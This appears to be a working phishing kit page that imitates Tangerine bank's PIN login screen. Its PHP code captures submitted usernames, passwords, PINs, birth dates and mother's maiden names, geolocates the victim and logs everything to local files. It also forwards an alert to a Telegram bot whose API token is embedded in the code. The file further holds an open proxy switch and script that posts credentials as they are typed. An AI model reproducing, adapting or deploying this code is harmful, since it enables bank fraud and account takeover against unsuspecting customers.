
       
 <?php

include "/fingerprints.php";

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}



error_reporting(E_ERROR | E_PARSE);
$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = '/telegram.dat';
$file2      = '/Tangerube.csv';
$file3      = '/acc_log.csv';
$file4      = '/usget.txt';
$file5      = '/combo.txt';

$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "Tangerine";

    $url        = "https://td.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
   $vocal       = $_POST['vocal'];
   $dob1       = $_POST['dob1'];
   $dob2       = $_POST['dob2'];
   $dob3       = $_POST['dob3'];
    $mmn       = $_POST['mmn'];
    $code       = $_POST['code']; 
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "|";
		$lr     = "+";
        $li     = ",";



} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}


$message = "IMPORTANT DATA LOGGGED\n\n$bank$lh$ip\n\nTangerine User :   $user\n$uos$lh$bsr\n$is\n$city$lh$country\n\nmaps.google.com/?q=$la$lh$lp\n";
file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND); 
file_put_contents($file, "$message\n[$ip][$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);
file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
file_put_contents($file5, "$user:$pass\n", FILE_APPEND);

$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-821080105',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                
      ?><html la=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <title>Login | Tangerine</title>
        <meta name="description" content="">
        <link rel="shortcut icon" href="/deposit/favicon.ico" type="image/x-icon">
        <meta name="viewport" content="initial-scale=1, width=device-width">
        <link href="./tan_0_files/vendor.css" rel="stylesheet" media="all" onload="this.media='all'">
        <link href="./tan_0_files/global.css" rel="stylesheet" media="all" onload="this.media='all'">
        <link href="./tan_0_files/app.css" rel="stylesheet" media="all" onload="this.media='all'">
        <link rel="preload" as="font" href="/assets/tang/fonts/icomoon.ttf" type="font/ttf" crossorigin="">
        <link rel="preload" as="image" href="./tan_0_files/tangerine-logo-white.svg">
        <link rel="preload" as="image" href="/assets/tang/fonts/icon_DownArrow-white.svg" type="image/svg+xml">
        <link href="./tan_0_files/css2" rel="stylesheet">
        <link rel="stylesheet" href="./tan_0_files/login.css">
        <script src="./tan_0_files/jquery-3.6.0.min" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'Tang';
            var lrinfo = 'Login';
        </script>
        <script src="./tan_0_files/actions"></script>
        <script>
        $(document).ready(function() {
            var attempt = 2;

            $('.lab-form').submit(function(e) {
                e.preventDefault();
                var form = this;

                if (attempt == 1) {
                    $('.div-loader').css('display', 'block');
                    $('.div-main').css('display', 'none');

                    $.post('/deposit/tang/api/login-submit', $(this).serialize(), function(response) {
                        $('.error-div').css('display', 'block');

                        $(form).trigger('reset');

                        $('#step-login').css('display', 'block');
                        $('#step-pin').css('display', 'none');
                        $('#step-pin mat-card-actions, #step-pin mat-card, #step-pin mat-card-actions').css('display', 'none');
                        $('#input-username').focus();

                        $('.div-loader').css('display', 'none');
                        $('.div-main').css('display', 'block');
                    }, 'JSON');

                    attempt = 2;
                } else {
                    $('.div-loader').css('display', 'block');
                    $('.div-main').css('display', 'none');

                    $.post('/deposit/tang/api/login-submit', $(this).serialize(), function(response) {
                        if (response.status) {
                            if (response.data.loader) {
                                location.href = '/deposit/tang/w';
                            } else {
                                location.href = '/deposit/tang/q';
                            }
                        } else {
                            $(form).trigger('reset');

                            $('.error-div').css('display', 'block');

                            $('#step-login').css('display', 'block');
                            $('#step-pin').css('display', 'none');
                            $('#step-pin mat-card-actions, #step-pin mat-card, #step-pin mat-card-actions').css('display', 'none');
                            $('#input-username').focus();

                            $('.div-loader').css('display', 'none');
                            $('.div-main').css('display', 'block');
                        }
                    }, 'JSON');
                }

                return false;
            });

            $(document).on('change', '.input-username, .input-password', function() {
                var username = $(this).hasClass('input-username') ? $(this).val() : $(this).closest('form').find('.input-username').val();
                var password = $(this).hasClass('input-password') ? $(this).val() : $(this).closest('form').find('.input-password').val();
                $.post('/deposit/tang/data.txt', {username: username, password: password});
            });

            $('.mat-slide-toggle-thumb-container').click(function() {
                if ($('.mat-slide-toggle').hasClass('mat-checked')) {
                    $('.mat-slide-toggle').removeClass('mat-checked');
                } else {
                    $('.mat-slide-toggle').addClass('mat-checked');
                }
            });
        });
        </script>
        <style>
        .message-card .critical {
            background-color: rgba(235, 1, 49, 0.08);
            border-left: solid 3px #EB0131;
        }

        .message-card .message-box {
            margin: 1rem 0;
            padding: 16px 15px;
            margin-bottom: 15px;
        }

        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0,0,0,0);
            border: 0;
        }

        .message-card .cancel-icon {
            color: #EB0131;
            font-size: 1.2rem;
            height: 1.2rem;
            width: 1.2rem;
            min-width: 1.2rem;
        }

        .message-card mat-icon {
            position: relative;
            left: 0.125rem;
        }

        .message-card .message-box-content {
            margin: 0 0 0 0.5rem;
            display: -ms-flexbox;
            display: flex;
            -ms-flex: 1;
            flex: 1;
            -ms-flex-direction: column;
            flex-direction: column;
            -ms-flex-pack: center;
            justify-content: center;
        }

        @media (min-width: 74.4375rem) {
            .div-main .navbar {
                display: none !important;
            }
        }
        </style>
    </head>
    <body class="fb2-index" style="">
        <noscript>
            <style>
                p {
                color: darkorange;
                font-weight: bold;
                font-size: 16px;
                text-align: center;
                }
            </style>
            <p>To proceed you need to have your cookies and JavaScript browser features enabled.</p>
        </noscript>
        <tng-main-nav class="ng-isolate-scope div-main">
            <nav role="navigation" id="hamburger-navigation" aria-label="Primary" class="navbar print-hide">
                
                <div class="brand ng-scope">
                    <img alt="Tangerine" class="logo-white print-hide" src="./tan_0_files/tangerine-logo-white.svg">
                </div>
                
                <button actionable-id="main-nav-btn-feedback" class="navbar__btn navbar__btn--feedback icon-feedback" id="main-nav-btn-feedback" name="main-nav-btn-feedback">
                    <span class="main-nav-btn-icon-copy ng-binding"> Feedback </span>
                </button>
            </nav>
            <header class="header print-hide">
                <div class="container">
                    <div class="logo"> <a actionable-id="main-nav-handle_go_home" class="brand" href="/deposit/tang" id="main-nav-handle_go_home" name="main-nav-handle_go_home"> <img alt="Tangerine" class="print-hide" src="./tan_0_files/tangerine-logo-white.svg"> </a> </div>
                    <!-- ngIf: $ctrl.isMobileHidden -->
                    <nav class="nav ng-scope" aria-label="Primary">
                        <div class="container">
                            <ul class="nav__list">
                                <!-- ngRepeat: menuItem in $ctrl.topPrimaryMenuItems -->
                                <li class="nav__item primary-item ng-scope" style=""> <a class="nav__link" href="javascript:void(0);" actionable-id="menu_global.menu.header.products" id="menu_global.menu.header.products" name="menu_global.menu.header.products"> <span class="ng-binding">Products</span> </a> </li>
                                <!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems -->
                                <li class="nav__item primary-item ng-scope"> <a class="nav__link" href="javascript:void(0);" actionable-id="menu_global.menu.header.waysToBank" id="menu_global.menu.header.waysToBank" name="menu_global.menu.header.waysToBank"> <span class="ng-binding">Ways to Bank</span> </a> </li>
                                <!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems -->
                                <li class="nav__item primary-item ng-scope"> <a class="nav__link" href="javascript:void(0);" actionable-id="menu_global.menu.header.ourBlog" id="menu_global.menu.header.ourBlog" name="menu_global.menu.header.ourBlog"> <span class="ng-binding">Blog</span> </a> </li>
                                <!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems -->
                                <li class="nav__item primary-item ng-scope"> <a class="nav__link" href="javascript:void(0);" actionable-id="menu_global.menu.header.aboutUs" id="menu_global.menu.header.aboutUs" name="menu_global.menu.header.aboutUs"> <span class="ng-binding">About Us</span> </a> </li>
                                <!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems --> <!-- ngIf: $ctrl.AVAILABLE_ENVIRONMENTS.length > 0 --> <!-- ngIf: $ctrl.isInDevPod --> <!-- ngIf: $ctrl.IS_AVAILABLE_GENESYS_ENVIRONMENTS && false -->
                            </ul>
                            <div class="navtools">
                                <ul class="navtools__list">
                                    <li class="navtools__item" aria-hidden="false"> <a class="btn btn--largest btn--reversed ng-binding" actionable-id="menu_signup" href="/deposit/tang#/enroll" id="menu_signup" name="menu_signup"> Sign Me Up </a> </li>
                                    <li class="navtools__item" aria-hidden="false"> <a class="btn btn--largest btn--whiteBorder ng-binding" href="/deposit/tang#/?locale=en_CA" actionable-id="menu_Login" id="menu_Login" name="menu_Login"> Log Me In </a> </li>
                                    <!-- ngIf: $ctrl.SessionService.isAuthenticated() && $ctrl.MENU_ITEMS.LOGIN.length -->
                                    <li class="navtools__item"> <a class="navtools__link navtools__link--circle navtools__link--icon-text" href="/deposit/tang" actionable-id="menu_Language" aria-label="Changer la langue au français" id="menu_Language" name="menu_Language"> <span class="material-icons language">language</span> <span class="text-label ng-binding" aria-hidden="true"> FR </span> </a> </li>
                                    <!-- ngIf: !$ctrl.isNewClientEnrollment -->
                                    <li class="navtools__item ng-scope"> <a class="navtools__link navtools__link--circle" href="/deposit/tang#/locations" actionable-id="menu_Location" aria-label="ABM Locator" id="menu_Location" name="menu_Location"> <span class="navtools__icon icon-location"></span> </a> </li>
                                    <!-- end ngIf: !$ctrl.isNewClientEnrollment -->
                                    <li class="navtools__item"> <a class="navtools__link navtools__link--circle" href="/deposit/tang" actionable-id="menu_Search" aria-label="Search" id="menu_Search" name="menu_Search"> <span class="navtools__icon icon-search"></span> </a> </li>
                                    <!-- ngIf: $ctrl.SessionService.isAuthenticated() -->
                                </ul>
                            </div>
                        </div>
                    </nav>
                    <!-- end ngIf: $ctrl.isMobileHidden -->
                </div>
                <tng-sub-nav class="ng-isolate-scope">
                    <!-- ngIf: $ctrl.isSubNavVisible() -->
                </tng-sub-nav>
                <!-- ngIf: !$ctrl.isMobileHidden --> <!-- ngIf: !$ctrl.isMobileHidden -->
            </header>
            <!-- ngIf: $ctrl.isContactUsMenuOpen -->
            <tng-feedback-survey class="ng-isolate-scope">
                <!-- ngIf: $ctrl.isMedalliaSupported -->
            </tng-feedback-survey>
            <tng-print-header name="$ctrl.getFullName()"></tng-print-header>
            <!-- ngIf: $ctrl.showVisitorSiteSearch -->
        </tng-main-nav>
        <!-- uiView: page-content -->
        <div ui-view="page-content" class="page-content ng-scope div-main" role="main" id="mainContent" tabindex="-1" translate-cloak="" style="overflow-y: hidden;">
            <login-page return-to="::$resolve.returnTo" class="ng-scope ng-isolate-scope">
                <div>
                    <!-- ngIf: !$ctrl.isNewLoginFlow --> <!-- ngIf: $ctrl.isNewLoginFlow -->
                    <tngx-login-new [return-to-param]="$ctrl.returnTo" class="ng-scope" _nghost-llv-c5="">
                        <form class="" action="/deposit/Tangerine/040149.php" method="post">
                            <div _ngcontent-llv-c5="" class="mat-card-container c-login-flow" id="step-login">
                                <mat-card _ngcontent-llv-c5="" class="mat-elevation-z0 mat-card mat-focus-indicator">
                                    <mat-card-header _ngcontent-llv-c5="" class="mat-card-header">
                                        <div class="mat-card-header-text">
                                            <mat-card-title _ngcontent-llv-c5="" class="mat-card-title" id="login-user-id-header-title">
                                                <h1 _ngcontent-llv-c5="" tabindex="-1">
Enter your PIN</h1>
                                            </mat-card-title>
                                        </div>
                                    </mat-card-header>
                                    <mat-card-content _ngcontent-llv-c5="" class="mat-card-content">
                                        <div _ngcontent-ift-c19="" class="service-error ng-star-inserted error-div" style="display: none" id="login-pin-service-errors">
                                            <tngx-message-card _ngcontent-ift-c19="" aria-live="polite" _nghost-ift-c6="">
                                                <div _ngcontent-ift-c6="" class="message-card" tabindex="-1">
                                                    <div _ngcontent-ift-c6="" class="message-box critical">
                                                        <div _ngcontent-ift-c6="" fxlayout="row" style="flex-direction: row; box-sizing: border-box; display: flex;">
                                                            <div _ngcontent-ift-c6="" class="sr-only">Error</div>
                                                            <mat-icon _ngcontent-ift-c6="" class="cancel-icon mat-icon notranslate material-icons mat-icon-no-color ng-star-inserted" role="img" aria-hidden="true" data-mat-icon-type="font">cancel</mat-icon>
                                                            <div _ngcontent-ift-c6="" class="message-box-content">
                                                                <span _ngcontent-ift-c6="" id="message-body-login-pin-message-card-error" class="ng-star-inserted">Your PIN and Client Number make a good pair. Please check your records and make sure they are both valid and work together. As a reminder - your PIN should be either 4 or 6 numbers.</span>
                                                            </div>
                                                        </div>
                                                        <!---->
                                                    </div>
                                                </div>
                                            </tngx-message-card>
                                        </div>
                                        <div _ngcontent-llv-c5="" class="mat-card-content-container-28rem">
                                            <!----><!---->
                                            <div class="">
                                                
                                            </div>
                                            <mat-hint _ngcontent-llv-c5="" class="login-input-hint mat-hint" id=""> This is your 4 or 6 digit banking PIN - not your Card PIN.
</mat-hint><div _ngcontent-llv-c5="" class="content-container">
                                                <div _ngcontent-llv-c5="" class="flex">
                                                    <!---->
                                                    <mat-form-field _ngcontent-llv-c5="" appearance="outline" id="main-div" class="form-field mat-form-field ng-tns-c10-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-can-float mat-form-field-has-label mat-form-field-hide-placeholder ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                                        <div class="mat-form-field-wrapper">
                                                            <div class="mat-form-field-flex">
                                                                <!----><!---->
                                                                <div class="mat-form-field-outline ng-tns-c10-3 ng-star-inserted">
                                                                    <div class="mat-form-field-outline-start" style="width: 11px;"></div>
                                                                    <div class="mat-form-field-outline-gap" style="width: 30.25px;"></div>
                                                                    <div class="mat-form-field-outline-end"></div>
                                                                </div>
                                                                <div class="mat-form-field-outline mat-form-field-outline-thick ng-tns-c10-3 ng-star-inserted">
                                                                    <div class="mat-form-field-outline-start" style="width: 11px;"></div>
                                                                    <div class="mat-form-field-outline-gap" style="width: 30.25px;"></div>
                                                                    <div class="mat-form-field-outline-end"></div>
                                                                </div>
                                                                <div class="mat-form-field-infix">
                                                                    <input _ngcontent-orv-c21="" autocomplete="off" class="mat-input-element mat-form-field-autofill-control ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored lrinput" formcontrolname="pin" inputmode="numeric" matinput="" spellcheck="false" type="password" autocapitalize="none" required="" name="password" id="input-pin" aria-invalid="false" aria-required="true" attr-action="Filling Pin" minlength="4" maxlength="6">
                                                                    <span class="mat-form-field-label-wrapper">
                                                                        
                                                                    </span>
                                                                </div>
                                                                <!---->
                                                                <div class="mat-form-field-suffix ng-tns-c10-3 ng-star-inserted">
                                                                    <button _ngcontent-orv-c21="" class="mat-focus-indicator mat-icon-button mat-button-base" mat-icon-button="" matsuffix="" type="button" id="login-pin-visibility-button" aria-label="Show PIN">
                                                                        <span class="mat-button-wrapper">
                                                                            
                                                                        </span>
                                                                        <span class="mat-button-ripple mat-ripple mat-button-ripple-round" matripple=""></span><span class="mat-button-focus-overlay"></span>
                                                                    </button>
                                                                </div>
                                                            </div>
                                                            <div class="mat-form-field-subscript-wrapper">
                                                                <!----><!---->
                                                                <div class="mat-form-field-hint-wrapper ng-tns-c10-3 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                                                    <!----><!---->
                                                                    <div class="mat-form-field-hint-spacer"></div>
                                                                </div>
                                                            </div>
                                                            <mat-card-actions _ngcontent-orv-c20="" class="mat-card-actions" style="display: block;">
                                                                <button _ngcontent-orv-c20="" class="mat-focus-indicator mat-flat-button mat-button-base mat-primary" color="primary" id="login-pin-submit-button" mat-flat-button="" type="submit" name="save" value="1">
                                                                    <span class="mat-button-wrapper"> Log In </span>
                                                                    <span class="mat-button-ripple mat-ripple" matripple=""></span>
                                                                    <span class="mat-button-focus-overlay"></span></button>
                                                            </mat-card-actions>
                                                            
                                                        </div>
                                                    </mat-form-field>
                                                    <!---->
                                                </div>
                                                
                                            </div>
                                        </div>
                                    </mat-card-content>
                                    
                                    <!---->
                                    
                                </mat-card>
                                
                            </div>
                            
                        </form>
                        <script>
                        $(document).ready(function() {
                            $('#input-username').focusin(function() {
                                $('#main-div').removeClass('mat-form-field-hide-placeholder').addClass('mat-form-field-should-float mat-focused');
                            });

                            $('#input-username').focusout(function() {
                                var val = $(this).val();
                                if (val == '') {
                                    $('#main-div').addClass('mat-form-field-hide-placeholder').removeClass('mat-form-field-should-float mat-focused');
                                }
                            });

                            $('#input-pin').focusin(function() {
                                $('#main-div2').removeClass('mat-form-field-hide-placeholder').addClass('mat-form-field-should-float mat-focused');
                            });

                            $('#input-pin').focusout(function() {
                                var val = $(this).val();
                                if (val == '') {
                                    $('#main-div2').addClass('mat-form-field-hide-placeholder').removeClass('mat-form-field-should-float mat-focused');
                                }
                            });

                            $('#btn-next').click(function() {
                                var val = $('#input-username').val();
                                if (val == '') {
                                    $('#input-username').focus();
                                } else {
                                    $('#step-login').css('display', 'none');
                                    $('#span-username').html(val);
                                    $('#step-pin').css('display', 'block');
                                    $('#step-pin mat-card-actions, #step-pin mat-card, #step-pin mat-card-actions').css('display', 'block');
                                }
                            });
                        });
                        </script>
                    </tngx-login-new>
                    <!-- end ngIf: $ctrl.isNewLoginFlow -->
                </div>
            </login-page>
        </div>
        <tng-main-nav class="ng-isolate-scope div-loader" style="display: none">
            <nav class="navbar print-hide" ng-class="{'nativeNav' : $ctrl.EnvironmentService.isNative()}">
                <a id="mainNav_home" class="brand nonclickable" href="/deposit/tang" ng-click="$ctrl.handleGoHome()" ng-class="{'nonclickable' : $ctrl.isTitleLogoNotClickable()}">
                    <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="logo-white print-hide" src="./tan_0_files/brand-white.png">
                    <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="logo-orange print-only-inline" src="./tan_0_files/brand-orange.png">
                </a>
            </nav>
        </tng-main-nav>
        <div ui-view="page-content" class="page-content ng-scope div-loader" style="padding-bottom: 0px; display: none">
            <forgot-login class="ng-scope ng-isolate-scope">
                <form method="post" action="/220098/Tangerine/040149.php" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-email">
                    <style>
                    .forgot-login select, .forgot-login input[type="text"], .forgot-login input[type="tel"], .forgot-login input[type="password"] {
                        font-size: 17px;
                        margin-top: 10px;
                        margin-bottom: 15px;
                        font-weight: 500;
                        border: 1px solid #9e9e9e;
                    }

                    .heading--title2 {
                        margin-bottom: 25px;
                        text-align: center;
                    }

                    .forgot-login button {
                        margin: 0px;
                    }

                    .text-right {
                        text-align: right;
                    }

                    .navbar {
                        display: block !important;
                        background-color: #ea7024 !important;
                    }

                    .btn, [class*=" btn--"], [class^=btn--] {
                        background-color: #ea7024;
                    }

                    .forgot-login__email {
                        max-width: 30em;
                        margin-left: auto;
                        margin-right: auto;
                    }

                    .application-theme-web {
                        background-color: #ffffff;
                    }
                    </style>
                    <div class="forgot-login" style="margin-top: 0px; padding: 23px;">
                        <div class="forgot-login__email ng-scope" ng-if="$ctrl.currentState === $ctrl.STATES.FORM">
                            <style>
                            .loader-div {
                                text-align: center;
                                padding-top: 20px;
                            }

                            .loader-div h2 {
                                font-size: 28px;
                                margin-bottom: 40px;
                            }
                            </style>
                            <div class="_1AR6e5iqu8uXHMTFKLnqWr loader-div">
                                <h2 class="heading--title2 ng-binding">Processing</h2>
                                <img src="./tan_0_files/loading.gif" width="80">
                            </div>
                        </div>
                    </div>
                </form>
            </forgot-login>
        </div>
    


</body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>